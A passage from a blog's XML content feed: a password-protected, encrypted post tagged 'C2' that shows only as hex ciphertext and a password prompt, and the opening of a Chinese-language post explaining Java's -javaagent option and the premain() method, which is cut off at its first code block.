0bb1f3626065e273f289be5527ad088eb70a7e18b48000dc023f6ebe3db99b6440aaabb1392de6c12cb42f7754ad11a76372fef148c6c3bba0bbf4f71144ce7874a90e84d85405d640ab59c3a16519452638f5051aeec61edc0c76789f335d94a266651e4cb2e27e50c826479664e65457a9c5849ae05cf79d7a4210f8563719128bf67a3722d8e55fadc45aa744ec9413f0c2b6e9cf106b790b35a93dfa9e6a5fccc99efe5fb141b02a8ea39010bd5644fb6d73d7a9f2f2e94e4b80a16354c0a37e254266ba14ad5daf82600f221f646b3f8536e16fe88060be8a5130e8fcc8f060eb201a900c37e5993d0ae6359bef612a05b8988b0278304b86d5ff48694c026ab7ee14afe7929bcc230ac2e3c2edeb023b65fe0068d8c4c592c1a637260ab7e0c342873fdc30acb3ab430418d84057cc9db8a158360a212c3b902c4437de87059cf3533a85289b919e431951dcc1f41203ec73421b3ad8ee20cd7ee8bfdf6c44c0137e69bfd2d51540a3cdc82d4c0b0624541a55ab06906329b6e053e2106f6f55fdaea718520b90239cf01df94f494668801ef695d2357e1fa52bb886221ec57536d087d39a338dc20bab01d6b3cb262407c675ac49c77aa6c4cd8375365b2d7db54835d8307c92dc4a523f9755f6bd226073ebcfe75e2eb5348bced3c7cfaba1409fc79571cd54fcba3f2ab68299ee686a89f435fa205a01d07abbe24851e8362e6889811d1860a91be053c5957c99453fb7ae33dc4823fad3e25c9fd1a74953b128386d8de0620985477576e445f83fb6a84d06f6697f5e50c7fe6f27473e175957f489e33561e0223c98d1b59b27a9e1a9957d36fb1564208607e72cc9e2fc55ebf93b2c9cc66fe3ae00d0ef5a7ff56061f9eaf51a589fd4ccd4db2302b086fc47847580e7dad33a37ce67a9b6acd5ff4c0972f3d33547d99c5d1d5c655cfad853e0968384397bf391008bf3ae4b5e0e1ddd08f55e7581b295ac054839adc50462f8910efdc840ffd776118259f8b4441de16225e08ddabc9b8c0a918365b31823346967804fedcb43e233371118b3c372f1b8fdf1b26fdddf236efa492a50009d407c4fa05fe22577407a0a1dc2825956198f4c2a287969c0a77d976d51085ee870b8580f240102268b03fdd86401a24baa87cf21fb80173511bec5b6244bb024633d74744fc5fb0a8dd0f7686f64e2d8d33178b5a8195a8139f135605d8840a173815be12895acf9d6fab02959bbc9c26de9bffd23f3bf48c2708d3ff9c389d58be4a20c87be446b4af23d09c951edb8423b785b34a96c8ca137d831fdae72d1f245ab4f99e4232ffbe1a838636140f8deb756100db59a55a4990656b1a4f2481c4cbadd25472f1ab8a79b344ec6cc9f17f52b133d7550b0604d1fe11530966a7a36ea41b233d35db8d78471c28f682ec36c40cd123ee871c2aef036f3d7a4a4d4708e96ee8e6b47e3a7ebee994faad066072edeed76df6f3420043930f9a6b5fc1641c64e910e029046235736138e8e40ccb052507273db160275363dc24b81213a373ccaab4d4fb5ddfea32044612140d48d591a55b59871538c004de0841d1e8a821e279ef8cfb967c2ede54f70f7166198f51983936b350645c3c6a87fe477ef3b445e231184bd0c3bfc27b004f3aefef6aa7255c20c88db539b3b00e3d49c7da125bac87b9d9773579f72ad371d804512225f21a15650eaa42353e80627d8c17824ddbbbb99b016d26c6467f08fd5fbe387fd58488715e9759f409a613fd0865677ccf1abc90f8d8284deb0c5eebe1857983e12a53b3c1ba8b939966cd5bbdde8e4af140edbc092e34292744bc81a6abd2490c2782bf3a803f60ddbc6e7fc03c00ba017d8d2d3cf0e331ff0839839d462e130d481374e162153d41c5ae07f5c55c0ac6e7d423f288c4c81ae668135777558ee2d8973603cacdf61ca5fe714bf15c05eb2d527b7541cb0d123133806d88c56501c189bbf0674f33dfdb5c8730b045b7cf12ce2e02c9639218c652f3445b77f16c11b23945f8e328590bec1741f80a53a522e0164a8786e274bc41d7af440a4aff4ad885fe6a59f1c7ad170db2df5aeebfd16e645dfc08e3d21e0e776ae467984dd8fe36dfabb113d615ca55c3addfd17ae40883f76a2c894beada378cd08cec1cedc60991559e05e1fafaa1ac05d0cc552e6a413afc08df6257d13b96d4b555c4cb49695350458f6672250cd5c0856b00ccb384fa2329aa3e15f547a2d2640089a767fffd271c61e8f6bcc1ea1e6385b26ff163ed7d978e138bea974bf4a618f4fe8024fcf3c1191d4c390f73482353df5266753c64404c82559df4cb263f22a41fec513c4993a672aed538464e57ee78a901568654cff25e2b2d44b04b1226b626af00cad61991038581f9dd866acb2ef0b990b33614c54bc2740b6d082a5e47e139eb9eeced2359c1e3e39cb9c512c22c0a64d9dbd2a38d6047717b964e8c31db7454835c43ae48000cae624fe7642a1817ad1441c831fc8a585710ca6cd01ea814d0c58e0c9619f598fc14832b6e3158ffc882130da1af499493b83ac5cc8c940255eaa1a9cee5e3bfbcbc5d770e4f89eec04beacb4637be0b77cc4fef61f7cb420430ae4d527f27fca8772eb47f0fd5c5cb4c23668517b2d5673a8993d5b9f506c4723876a392e7248d363eb80e6e2f1c038044d8995f380900d69a6fa4c3202622f9d118777f81277a48c96d8c22bf4a7b9e4ec47c27a6eeed0970be3a5baf6a1e2785d55506995f68f969671d0b4c915f15b21ee341b919a1768ff8779928ca754257a09fe3a28c37171b86809d971a069c5102e19808fbd08e50cc9d8d49dedb693b28a28bd77ac9e02cb36a2c42d3b38913a7a4d7a692215d3e5399ce1dd2ce1b4f8e35080bd6d7438f6294204967078718182e0b941789b1ca34f24ac136a5d5140ccf970c0723e6c001c3c6436df181a2762d0a162172d1ff160143261ff58b3a51cf6651ec6a3e1b9ca7a60aacf30c08f3ec70d1944bfe0173810f0ec4cc8fac96b9722376ad6293aa43efd303bf8ae387085c73f567e17c042a31cfc3304a5d06bb2b83676cd5af1108bfbf6ea78273b654d5b74623b3ffa5a4dfe586dbebe5736491148e0bb5949b8448ae80e83d9466913c7bdcb30050fc835e569619c4331b098b7982aa5035b61744a72ae25749a1e475d95c11f74ba84cb82d0fd0683f834ae3e00d6a18d1919d0514985cfc88c7f434680007122920c76c65b9a56666aacf338712a85a490926423b9075002cfbdff762b0993b88f75465f76c78c4acf3c0e61cad72dca0d63b83a7b9022214a0b50ec50d6326c2e5df56d61db142e58e164ef27c6f4cd6a0fb9a7c48f9f11037f5f86f595ad2994045932ab945cc4ad7a2f62a656916cf43a58711515b84fae9814032e859d63df4eccaa4d7f2ec1d71b2af55c66e1540e0b93bb5d92a2d0ea0607d11fe69482a598d5191645abc7e29f2549639b724c196efbfad1cec58a493b88aa869f97e456d88fad13e48270f465b18a78c2544254cdbd87c0a2af69c8962be1f491c9021706c89be7c11b03fcea725a9876a60ec91daee93572c83594746d2fece7ea8260124d0c95a9b459a52c47de3bd468162e8bd749fb0a517a5e3768c84146d4585d0827f915a6d9bf621b271830ca857c7600e358ec4f21f42ec556227883a40117aa83bf0b6cbb56f2d4f89c803bb5374202020f16d878295c8aa46bf5bf501373a4043827beeb6bcf6a42ff929cb0e97c1896d0a4228d981499be001436c8c5e382a7fec6c08ff90d0873ec3788d754ea26d02b7a5fc86231b57795ce8d57b30684ce70033141c04ec3b7be0016d9bc63dcd168805ed68ed71ffdc339166299cdd6ca5c4dbfc97b8e3a30d8e1cfcb15b3a92fc29b1557b0e921349d43ef7fb850b6e0229be9b9216c1a3461cb66f0de33765d109119190cd8414e966576a33481a9460dd30275a2052996f1ae74771cfaabd67df21645b647a11e3f77a5b36778f67a766358c573e53f9babeba1a5f16df15833db70733063229fc499cbb35961a791cf6fe12170efd874e5d4cb148f11623d23eb08e9b856095eda8dbc800c7fe0b596624b6265fad9a09c3676c5bd4303762917ce13b87521d2fe28cbb747679c94e51315084b41d4364fc7485ec2ee10c5eaacb98f39fcdb251e0f472cc932a591d7a9600ed9a543fd38dbddd46ddcdda6ccac2bd98c11eb5f2b950b8acfc07e7ddc96579827873bf9140a13a75a93ed076887e1d602ac75c381b308243d8c7f340b3a70c6e9f72b6c173427ad49c1b9af7ae6c18d544f8af38300e725b528d5ee91d8f92ea2c61144171f338bf1ace8c415daa614fb98feb4d77f514a803f8d5c251da44dfdd87ab709f859063fc7474fdc26d2387889bb05f9385e79fbb9779565de6eec0e1b74b7df312076d8290020a945ea795bb74245fd1e971beffc38081c4ba47deb2938402179e807fb89f95b24f1160046206c1f6ff457c39226500397fb194d84df42c644c3f1b2a09f5235154ef1118d0b3e74fa3d0aa00db9c795e384355d71a32b42c82fa17b061fdd7d2b1c93e6fa1045610cb5e4a0624db0a75a8a33037c819d275347c5c9015e4f4958f9ce36ad07e0ddb0663907e1e72607546402fedac4ab6ebf32ef1cc4934b79dcaf1cd18538da9449e67184ba939101c168197b0d098699fb70a745d2d487db641115bccc4e792e03cfd054841e28ed88fad65e8083eebdfd31fffbaa892fe31c4b5ad12dbec73122079e614d8294d60d80c1afe0f0f61a1c8cf1d278a2f8290c153cf2306a048d8c6cc8d1371dc00f17e017ee9a02bd04830ef57db769b9a0561382f50af660b4fba1ec8fa58ec29e6696bf0438ffe4c1a64d78792f5d7aa152aa53dc9f09a5abb2d2703896f5ab98fdefbc3a9da8294b611cdbf9af9e1b8fa7743aec17059bbd5121d6587ce66189f88fcb8a3d13b8ce04b7ec6f4d0af11e1693ee6f06f106a9df481964712e70e4b9caabd4831712e8a59028ee3dce97fd02bce62656d3004b74554c07489444340e75792fbec44afaaea8b0843248ab4fa7143d64bf7653950d71694d7d2d18f5f76e4ad2de476da93b6f9934a7a5c3f215350df88ec85cd51bdb019463f072cf61521c9f1338743428f888be63b96e17482b421d8c111127f4ba21d5b35bd8f2ce09f0dcaee9aab28b0085a30380d1332877fbfd093d8e0af2eaa2d8448e0c27e61eff46c64463cecf8224d9c28544653363955a4e73be87cfd466bbe27919b49b9352a1f60f9fe377f4557968ea00937bf4d12e696cabf53a43033685d88dff0edac1de893f73576c58cd731489d033b7e82cc61624cf1488f7351d5f574c8f5d3a262e02ffc0b63989d5675fb1f87cf966e4d949a564064a9c49d1b9a411d8573aa438a32bc0ab63408e0e4872dd2de5a438ca132e05a5f5adbd4b4f5d1f869c84781135e5287bb7c67c18f7604e487c1bf998b913677145c7058dbaeb5ad066dac25efc7ac2bf45d68861d3a59eec9ade07f47bc9465420171691e8b21763482d98a1464b4a705d22a10b514d2875ab54b8d59f48caae2b103a75c8f9700682de300749fd30b751a2bff2074a84ba058d338200bfa3284ff0b8ceae36eadb9b82b3ac3568a11e383b691c0372ddabbbb4dd87939eb36df18d6d407127023577e1feb6c501385eaa209261dffdda416fd3fcdbebceb363a5baa23204221ec7b60006e9db49ca722933b7497ef1639f34824f16fe02c0c969ceac7531203e23498cfe9bbc1756bce64358d103246163233b5fbda4705dc7b497fb0f917b360311ecb078738f0dbcfe49c3276d950f06b82691c4abf8aa07b9d51be6c87dcfc8bd90fa158436bb5a3b0f255cf4a06d5f11fc3173db6314da3aaec823da766bf553567d5cf57788ee385b325786a4e22ac0efcfb30cb5cfd41c0ef8681f80ba20cc5ccc9cb142dd7cf5e91f95fc40fbc861dcbb8ea704fd32682f2a95537c5bfae353efdcdc2d67752ea105f3d0ed6699ffd1fe1eeff765b02f9b7582619940e36a555572f8495ae098117df1b2232baf07d331e8a6a7a0bd4f43c43902c15f107f9965ca78dc61f54dd9e49bdf1199c7a8a5a66076857ca191be647becc00887f1b2548e661628494e69b65aec47a03abe8f6f787184c96090454f273fd98a0f756b2b73214a0ce9995adcfc0b9039351eb9d75ef6643f61b22403dcfac002c684b84be1b34743fb499c0012206cf38e8e38fd8a40cf41d10357955294f93853accb9584b2dd01672d599f7c4fe58c91df4f23f772b5b21a0d5e2811d9c5ad6bc58b1dac0abe97d43932d1abe813cc7e6f41dc072f77a75800b06533d4a2e3aaa4294e9509e840bc3fb4a85c460cd85e24655fda63422620a67d649cdc6408a21fc73ef6e8983dc2f59c1fbafe6bb61afdc7f2eea7a4bc7122021ed012f019190a061e46b604486947ca5473c76058494deee03f6e964d1ce1f0b9994414b9d4b1cc05c06f10fb7fe05d5225425e97da52d2417080240e3591bba32eada0c929f97c212b5e4677bc9d7ea5ef1e8ebbcdf93d5e2449ce4c30abe4392efa399243f6df833f3265cd77dffe26f9d5c25dcae5772e6c8645ac6c2711b269b5707f0dbf495544ee86a4aaf1576de2eb996df5ee82e36b60c50a65c036e3c6135605902691c3872b27ab1964ff465602701681d4c3bffd447a00f87461006a2da4d554cfeffee2f1ba85032dca8cd414bcb347024963683874fbfb49a60a40c9740e5aba7901d35f21644b9fcc6cba93f6ddef74031d14d162c25f01da9786c2f84b2b6e13271b28a4e3b06fb6f818b446e756fbf787aa9152e39e1ec7744403ed010e1e5796840c9e69105eedcff5f29f876f291a163b6949f83f5579dcc0e82f2f4e305c1bf6bf2d64df12936a464f9040130343e3555983db0a66cf1634d180de1489a0411c982cf4e415d7a6f7461d6115031a80298d925677a3c7c0e250985bbb16beebb45017298c99e55319b825f95284ffd928a69a8688ae0adfaa9b4d7f7d0ce5565a991a21ec79323d013d969fe4d73d0dda2f33c46a725cdb7c76b2a9b09ac65e0477b11b7a875f5e02c5b7fdb0529ad3bbf95fa8305edc0bf4adc1f91e84102753bea3d1277dcfaad4e68c5322effe764748e4e9e4b36d4686e39d3235fdef98f5314ce24b6f59cd864c3ee16102a974e156fccaac942dfd2b12db2c220d43906efcb5aa4b84a8a00de7042beb1b942de598e70e5efb6b18d63aa1e90ab1a6fe017d809b219e029120d8e5d1c5fba0b257e223d9227a2d321bb83e24d1313ba807ce44adc6734e688d422effbf61e78298b0505f34fc79deac2007b4c72f58f6d691277e5babee0d6898cab58fffe827e36ebeef49b0c0079612808d10da1b82a068610312cd14c3c89b0011c15c7625abdffa2674cd53c9358f62335a07dd5d25aca6d28a673523225823976ff72881a99a22b42b2f9540f1b24da98d4ad8fb7a9c64022686ae23b810c090f69dff9c3d73ff31ae80ca79c090198c9b245512653e757887be2dad786352c16efb8c203a7b8737d031624285782fbeca1a3a5347fdffdf874e9480e1157c700c184b988497b946404b7cfa231d4a19b353e635ff53669f1ddeac31c44b57dd14457b8e059a74aa7f2c61e01378d38d1e676c1312a418aeb8d95264f704d368f076863151c758bf3f3a0af0efb847d778f998d9d2e77fa12b07d667fc4c1c8f16b65a38727405b9698be044bc41d334cfb1b168d040da7208703cd2194ca23e9197823e6b4764c56e121f065ec8157a11ac3a94d1c58d1168d9d91c4bd541de2c2a6f38059d130307de27fbaa9eeed8c86a7ac980961d8d01dbc6f1985d7f72fe30d27e2626875f84061acfeb61557e3c823fe3400fa37829c7bc8d252ea7084458f7f712c4cc525cbfa2697186085f53fca93b3a3a3b0b2a91dd748e6a139635a1fe6d1368e8cf303f06f0adbac8a807775badfe15c3067f0a2b4011c3370ab75fb14776275467c02797c5f4c2fc3c003138ed65e8c950218b7cb3db768f15fc9a1ba204fc8c648bda1e08fac77e7b644ee2f4905ba395f79c2f17f3d4fda2dd8ef275012198fe0148e0e251009a7c01c944f7a08774b378d3d24ce07aaf877cd5f01a89716d92d0fced4628920719ca1d08a31098363a2f30c80d8df4eb404410047e1327ce60b48888076ee7ea1b5308e5618bdb1cb3107ee0f37343709dd2450fd8f027d2b4fbf51d0b00577540aebd379ef12e81eff597df09260177b13c9ff90d08fc0c47025ecde9a4dc158e44e49a3f576db05eede57520a75bcdc2af84cc4094424b1e1ab641b6a2d8675cfcf04aae23c8d75b1fbd606d8144b52bb472fa53b963d579f09cc4f792ac44cc36a8bf47d357b5abeb9a7bc7c387c68641449f18086c52d8ddac895461f700c2dacf465b68d04cb08a3f0816799952cefcfce45f3a016f160a3b0197eeae4eb55490cd56ac6a460a26556bdbe991ccf31481d8cea127277be6dafc5afa8bf1d5f9d5207571cf9d2aafa0d2b541d7d61806a010b6b2d71b370053165e52281c0d1388cc1ba2056942457a98f0d6243d795b518d2fd003be360b825cbd4332f6dfe52c0777a346c6d69256b1209f49562543375537590d1bf401bac12bf260b3ee4f03365a43a58b39b055984a87109bf720fbe8a8010b20601d984e070d5667b2ccb36b2303a5fb12dfdf2c04c866c5bea2e89a44e1db13199feac21ca16018b553f8bf3d86a003b0b74224af5b909de8a1843afc13b3f9c29165cb36ae2e9782cae7e9d89614a495d50df6491ec254cbe814d871b7173441fea7f06ca263872a731214652d4d4dbcbebf6a3b261117115714303a150a659fb33a5752a4d8a4764826974663dedf0ff226eaf8d81ffa0f7074e560bf05b9aac8192a545df95eb585a1ad756f5a76ea6c1eaa870332075fe6b9926360583e5e7d8d719c7cdac7ee2ca16e6e62f57f39046b281d913c50ff8602f6b39f9264ea6f29020528080722210fd9be1666a9285d79ba9ce5edb55bbb317dc4f0fa11729f67ca8631b21915c80ca393217f454840deee198769e1bd02eee4bcf9b8132050d70b89ac7d2123bd3934ee4a4f54c64d290ea114a057a44ac14d1d12f4ff6a7e804577066e686791f1a2131fbbce68465d7478731714cc5c1f8e02b155ee17c6564cee2634f04ec2266147d87cc74ba7e1f8770b06dbb3268cefa4fa0381051da3eabedcd6d97b6aaee09269b08ab4f24f969e27d6f3e7b4a42377da01ee2bf3505772e88f9f7dab4f82e0d1247aaffe57630b2088ae44b509b86bd6b42c6e957704009d11af7a02b1560f91fd14cd1677a0ffb958d4189ed318f9b5fe4a7397d2d267f829a7f29050d21a01af3c4f9de65498ed2a12954dc914fd5070016b109c87209fdecf90cd577114edc26ab55119cf66bd207f28a062a33e69f558cd4bf7bc0e33cfc9bae05c1f25141a37dbabd121fed1355ff04f21f6fe9087e3bf657e9a732d690a8941e73ea5376b51e1227e98dc4fdde83feee08a17c53c1ab87256a2812dce2e52335bca4edefe0713a5daf3e8c25c09fac86518dae17d81e37162b6df48edc40ffa753b7e91794479f065789eec5dd3da2ed37f98901107227ae5800a032edc9f0d938f6f58f3795a289bc9c689559b604b2c0269103d759ae6293d9f93b342901d93d775d54a72561be8c00bdc74f050d9cecedf9f78f744dbaeb3fba24ab08a4d4aaf6f4d854e32c15d7472c3e434c5b3fdffb754c943fbf52bdad5c10dfdf5444754f2f369bb738ac504edf62229fd32ad1e056cf84e856b38780ba20a23b6583399f6887cffd84bc42eb7bcaaf8736d0dfd5e5e85f2f0537fb7407243b4ab138df546d252bf58ef656a9de431335c2fce2421fee62f013d879ae40e58f6ccfe10eeafb2d24acfc9a5d19efc54b6e9eaca6c65b119f16f6f60113192041d2dcc7c479b5c8551788160a712e22af09c9c1c82810d5063d9c64c6d628ae55afca5cb99425e69d13aebacbec21f78cdb26c9ec0df62654e1759236b6f5dc901887d03d7c0e80f5497d9dd4f30be380353a90d644d9fafd5a4dea5d89b472ba71d89499d7b07349ad086d768f2ea54d9ae20a33672d5fd11d98d5458dcbdc8ee125b1626fa641598985e9b981775baa0a0d6775f80aa34f737ed10853c5e832405102d22d55491e296f3486edb4fbded54733d70a4cd21e3d4987242342e1ced13e6b0a3fe98823c67819c415a954be75c99542afe809b599eb68bdc1c5ebb9a193b6587fcd80626912c77b97af492f4a4adc7f8d7e3c3341f8cd84cfe11a70102a20bc0cd7e91b5cac41cee55ace1028c543f9c132674828b9f8bde55289afb1a40c5b638f97dc025c8ad21ea02109793c1bc25f9496653cfd36c9cca18991a55cd4a96a9fcc3d96a6a04fb1828b095fe92e3d07e3751b3544068e40cf14db7496612219886ef9a464f77cbdb2a45e735a48d1fa057d1f00a63868766c079bea4c7a2aa177df77e20be7bc899fde95f83b34ac5dc9fc1d3fb621b237c3ea3d449e932207384c5992d964d41eb8ee2adf57fc96fcd5426ac0f68b81d1997b661e1cfa16055cc94b66bcf2c00384f51589fc941e4ec7a75f757490509a87667ad8c077be5c3975cd15b4fed23e1bb49123b7aaa87f1904b4511a3df0184f6e9c2997ea09d4389454666d9c106253260d1dd61aec3a01c53de5ad18c7df614dec57fff259023b03724c5c0176e6716451fcaf686f719dd4edb5717649d378a04dccdc4d0494b28fdacd54e60b906e61396e851f18e91eb541dfef5e1e2859c82c0255124f960973b59b738aba59d590c34f98495e39de0e4b766edd9ee1171ea1a865f740b0fae01b8deff8c9bab77c9ce616ecdbaef50b784a5b9a6f360cf2122b718642b7718febcb88b2dc213f0234740f3756fa60e891b80deed161ef515bb2be388646a86a31de98b63563b2310ccd70379b072322bfb5ee3dde92a846e0445a10846b093d65b0e3b50523fc0655356d47b506cae4f182d56b7495cfbe39dcb300abfcbb889ffcd45ffdef63baa3f62d75170061aaaa4a87f6e480d6d2b10e638f9f211c93c31afa46376dffed4998659b95987667c7812fa6d26c78c0503c24402d30cd015d4bed9bdd3ae226614009cba78af4acb72ffece61ab1cae3e81566564e9a6fa924e3c044d9c1e97e400bca2b4391c26197759c445a4091e6f6bae7b7f5c01f378eed01bc145e7c11fc237b6c961f3f68a554bcab44feb01c6c6ab82e2f1355c06ed57a29794b07a19e9462c2df6e8bf7968564405eb46e8f06b7f5805476eb91bad361dce3ae9464f04c463862ab0e0a499d697cfdb1c26c5d51c3bb97f4cc590097b53ecef9450e69c81e02a0462a9c36461c90d82702aab9056eb5bfbf379ca80840fbe88dba2333609c4e30243f1e3f6b5470896db6394a7fb96df7c5a676dfc18b747bc8876acd7d17ad50fe221c605a04c8839099a836c3916ebba71c6d03424fc813abc2a477472747ab78e1b469ea4dd2f8dd939596708ebd45f2704b4c17e05b8f8301ea1a6977732f35c6ecae7bf1689754ca6a33e2cda7944758156b0fed781468f9d3a0c114ff3714acf3113097777c4ac092e169526b3e440375a2b1f28756c05ab01a04592d5b0b46cea22a02f6443938b025b98ccc4eb29103682364c55f95723f00b134803814a3d4ca0394a74edbc2896fe5100a1fab92f8cadf62e07a2869d59138e593d0602cc4308a2e253a5bd4a9e6c10fcaf12e55117cbd821ae5e8d8912c4770f286b6dc6b1617a36fcbeefdf1b1ee4fb682cd45e549fda995c19c346f3114d48dd36ad43b389fac4820e057364c320a810382c2f71ce8af857f6338c691da9425eb84e99bc2825340dace9d207504d50e56d68d871810d893aec02ebf2fda3e95ceab5c4994556a65644e12dfff016839e1e57320e8282564fff05a5389d2f0a9260d428c3df0b3b5a3f56dcf4b508dfa325960b0d985711fae1b719bed809ff26cbd2fce69cefb7916e251c23e03e20a383cca8f910810132cf118f06b6f0decc65dace4fbe71c4925ef60a493187bc78b70da1840243208ddd50db6ff3d9fd59443e4db2ec5933ab50880a6c5e07397ca47ade68a70554552920bde325c9c3b84cd15b9ece76854a9609b87be330f993d0e4bf9af865d0820f49cb3dc837ad139df5bb824dfce2bedb1bada381a485fbcce8b6ba3799755146113d91f769d92b7374bd45033272faa9aad00b595706caa82e6e049239b33531d18f936e901af0082ef79ec35326bbac3b11d8b6a65812be072eb2bbe9ede69449bd31d233322d3cb59f140eab4d16d77b6bb0275c54a2030c87c22d6d7cd349dfe1ec984e522eb730e3a867f7e44e7139fae39f0e987b70aeef250e077640addba21e886f19eabbda104b1f612d00e5c2da058ce20891b9acb4f76bc4f4bfc65f9714631927d535421beda13e13183d8ffbb73213a04d46f70f7b3cd09dba432a6b1d2b20eb760f0aa5dca56bb1dc4ccd3654a9d75e04ed55e1d84d7fb56cd0e926c04601e56b1200264a414dde7b8105c72c642be5b2a03d3be15003eac3b559dc44d66bf5f497b20b22a0af8b70527290266cf8dfcb0d1171b0a7d6fc809f20908a5b5ef138b28938a6ee78735021f96cf8d612ec5e4236aa22cf289372f5fe34517d3cf56713844e314ab33b4afa59d5a8ca3db73c9a4a37c7078cdf972779ce46284c602f91b9074dc8f03b5bf25634c6e0d8d082dea21e8082e40252b3efc1dd4cbe0266cc2f94cf11215f40f61757b0ee6c618eaad8ce42125b6050e3096258629e97a975544a2fac417087c198efb3a0bd6576751f5d2bd6f08e3c7c8dfd6ce620049607d0f7cb57a1303a90e5fe0db25f6d3f36d183d2b86a34af6468fab176ce1e982de80e72b3ff0d71076c7f7455168bb23e06395272b48bf4b4267776a18f5dbfeb458ebb42b9e4ddcd9d0fae5faf543e5d5e20a2d3734b4750d09a5cb9efdeac1e55333e91e506b5d317b3dbc92bb485ccef32b1f714c43b247c5219e30d0f75e0301e944d706b3a8006676084eab415fcb43eb082b0c5b31e8e135865b4799c1ce813e65e745ca05f9de17d6a77e87befdbec226267970b8896a34e8573e5a306113bf1612b102f1cecd64529f60cf8015e42c3251e7df0b99af7af7539e57bd14b7174f4833bdb8a283d93c774b42cba5fb9614305dda2e5535ae1027638ddb92383b272cab6ec5527534ecef8ad3cc6361b9cf589c7e2848d61493225157b2cfeade630eace2ef16876edb4562935f81902e2e19dc11fbfd82dcefedd0f97036f8511e322b6cdc2620a95c397528d50e1754c094c7fd21a949ebce2cf5de1d67449aa0db5a2fbf1d1ed0f9bff2290963824462895ebcca631102aebf604f28278e9cc656714f5fa8363042f0711a3c0b054d6969d817d13904b48db655ad1d23b4b3f00897ff19029f8b2fa3f0af5747c997017a5ec4f1d21e0dcb1e60f5329a4fde1ee0b814cca6ae87ebd6f32341cb9ba45768a1668fe2fe1e044a1e137eca47091827e0ae519c2c58323b933251c55d04731aea1c778854d28df9fa001e558062b768a1c9a4290b82f9827f742b19507a2372a9cca4d5a1a357964288bff7b5b90bd2ce548319413d1a3ac7c3127bce32705ceb9984976f1d2fb5f01a2d735010cea7c2ec98e1b40c96207c0b3cce34ca1c78f22cca3980ef041e34d5a0fa5c3f54455aab9228fe5ecdc94c51aeddc8d835be887ba5a59521f131259e5bcf42fcffe67cfb4592f23f87a4bd5d6c697783d882cfbe71e5412cc60c270417f3ff318474b40d888e69fd5688b558e6471c6ec2758fbfc78907f39b75025f69d5ec9c10b8ca060cae6153631fd3377b049e60765d1418885e9af9a5e10cbd4d17f92fa010cd5e2a03642eeb0b2263b5e0f339eb1054d84f8106dcaf60e5b146127211b5e0619f4a989325778e9e63104b5121c2bee95b1b46be608ba288f460fdd890cf5448c4193a333d3691fd10401eb649bc402bdaf1a8f0f5c5d19281fcd2d4ad3813a842fc5836e3acc69c35b1369dacf6cf7abd658eb83b0a9c3aa1377c33092f9112dc91e5b159db6c0f12cf2b1eff241c9e918358fd5941c3329dbaf9020dc592f93527eb5b438a6025105d21f073ad568248b999e0316ed9e6271545a2d8972e65d0c2da23f79c58277d454f44ac7303daeaf83fc31a79f9e56d3d2a2f1b592586519615f151be06be76d45b3641b5b29a5c6242b5f0ac86ad7c3831a6e0ebdaa7fa4173a803d82b3a9dbf0b983ccf8366f01241e89431da00b2ca731bf97eb9f8b9184bdf77fcffa04208b293864ace9e53038ff7971336b556dcaedaba3003d74ffc23b9f4b43d3b18a6cf3ce875ed134d618d9ce69497707680c9dd5ec3e63f678abf8fc51d0e0bc1d9cafa57d28cca1d0f45869117bc2efff339f6fdd47caf326e2894a58ae6eb38d52177f591c49b4c8312560cd06e2ce2fda433a584e53a83bb09f8a6aefc3953377d6a1a1a91bc64dd4f5fea1ff97202e5c4a3331f555f0d21815dd5bde93a1b39bf20aca0512107cd129332f3beace44f74486cb74759bb2575b7128c95ebbd71f871d199eb5ac42eac21254d3b7eb7d5e228c4907246f445693f3989117a2fd780cde18c7b18aba8a826d4bf291329efb8996cdb7de15b951ba2f4e2a8b42dd1d24e98134f091cdcb2543c286053042ec9590c8db9478b8cd5b8e93dba24e066de1c36e72571b5d0a0e127ecbf0795c7c387c3d430410565406d4477bd456aa4c6a64649e924a2ccc946114a6d0ba459f6f97fccafe6a1c332149f71f051ab99db06a40398bcd1e8a793784e9aa84781f57ffa6a34a2a60cf79b68911b944163f134deb4a945ce0538958ba3625898823a655d37456f71a0abbe854c9056ec26e378f7b7ca5e045248f32d3aec275cf600076d7591ad71fa86ae21a6b68c972fa1762a86836ad141cef801a05b62e2136765afe39ea0f2ec310f25d83246ef3f5adafe1250fb7f346f52c0a27f3614f01cd37ea2f4a839461044029d50840bb54097eac40f5efe17e011378e6400f6c9e8ca3570560452e5111cc6588a7ce3775f7606a4240f7b8a1b005560102d32ddd1ce0b21e43f49caebdf3352f5a0b50d2caa21b0c40597ea0db6a2df5250bd58146fcece4718c6897072aacb27764ba4731a32d2b53dd8851a96bc9ad64b0bf31d67bc5b426af56ed9a85a8417e42919ecca811ab913ad89f21000ddf26df43f1e5e132e4089b148795b40902867c7a2dc81d1e695bae0685f833e286f5745a6fc22e5e07dc81ed00053b135f0e319dde606e1b9350a5cc9eb93f0650640fadb626a92807f57e3a2970ae6f4da01eef67d9ef3cb8e43f32a204a06849d18c80ec6dd94c9552fcee5efcf33fb341866b0d7e42857ebbee4ef1f1dc5fce05c3a6cdf0e2c31ffc23b705d307bd18b31</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaagent</title>
    <link href="/2023/09/09/Javaagent/"/>
    <url>/2023/09/09/Javaagent/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaagent"><a href="#Javaagent" class="headerlink" title="Javaagent"></a>Javaagent</h1><h2 id="JVM启动前静态Instrument"><a href="#JVM启动前静态Instrument" class="headerlink" title="JVM启动前静态Instrument"></a>JVM启动前静态Instrument</h2><p>java命令可以指定一个参数javaagent，用于指定一个jar包，这个jar包有如下要求：</p><ol><li>这个jar包的<code>MANIFEST.MF</code>指定<code>Premain-Class</code></li><li><code>Premain-Class</code>指定的类需要实现<code>premain()</code>方法</li></ol><p>premain方法是运行在main方法之前，一个<code>Premain-Class</code>指定类的方法</p><p>在java命令中可以看到如下提示：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 